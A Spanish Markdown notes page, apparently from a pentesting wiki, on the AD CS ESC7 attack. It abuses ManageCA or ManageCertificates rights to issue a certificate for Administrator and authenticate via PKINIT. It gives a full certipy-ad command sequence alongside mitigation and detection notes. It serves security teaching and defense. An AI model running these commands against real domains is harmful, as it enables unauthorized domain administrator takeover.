---
topic: AD CS — ESC7 con ManageCA y ManageCertificates
tags: [windows, activedirectory, adcs, esc7, certipy]
---

# AD CS — ESC7 con ManageCA y ManageCertificates

[🇬🇧 English](adcs-esc7.en.md) | **Español**

## Concepto

ESC7 aparece cuando una cuenta sin privilegios tiene `ManageCA` o `ManageCertificates` sobre la CA. Esos derechos permiten aprobar solicitudes pendientes, añadir oficiales y emitir un certificado con el SAN de un administrador, que luego se usa con PKINIT.

## Cuándo aplica

- `certipy find -vulnerable` marca ESC7.
- La cuenta controlada pertenece a `ManageCA` o `ManageCertificates`.
- La CA permite solicitudes pendientes.

## Procedimiento

1. Enumerar la CA y confirmar los derechos.
2. Añadir la cuenta como oficial.
3. Solicitar un certificado con UPN de Administrator.
4. Aprobarlo y autenticarse con PKINIT.

```bash
certipy-ad find -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC> -vulnerable
certipy-ad ca -u <USER>@<DOMAIN> -p '<PASSWORD>' -ca <CA> -add-officer <USER>
certipy-ad req -u <USER>@<DOMAIN> -p '<PASSWORD>' -ca <CA> -template User -upn administrator@<DOMAIN>
certipy-ad ca -u <USER>@<DOMAIN> -p '<PASSWORD>' -ca <CA> -issue-request <ID>
```

## Variantes

- Usar `ManageCertificates` para aprobar una petición ya existente.
- Combinar con ESC1 si la plantilla permite SAN.
- Solicitar un certificado de equipo y usarlo para RBCD.

## Limitaciones

- La CA debe permitir el flujo de aprobación.
- El certificado debe tener EKU de autenticación de cliente.
- Un parche o una auditoría de roles bloquea el ataque.

## Mitigación

- Revisar y quitar `ManageCA`/`ManageCertificates` a usuarios.
- Separar roles de CA y exigir aprobación con varios oficiales.
- Auditar la emisión de certificados con SAN de admin.

## Detección

- Nuevos oficiales de CA.
- Solicitudes aprobadas fuera de horario.
- Certificados con UPN de Administrator.

## Referencias

- [Certipy — ESC7](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc7)
- [0xdf — Manager](https://0xdf.gitlab.io/2024/03/16/htb-manager.html)
- [SpecterOps — AD CS attack paths](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
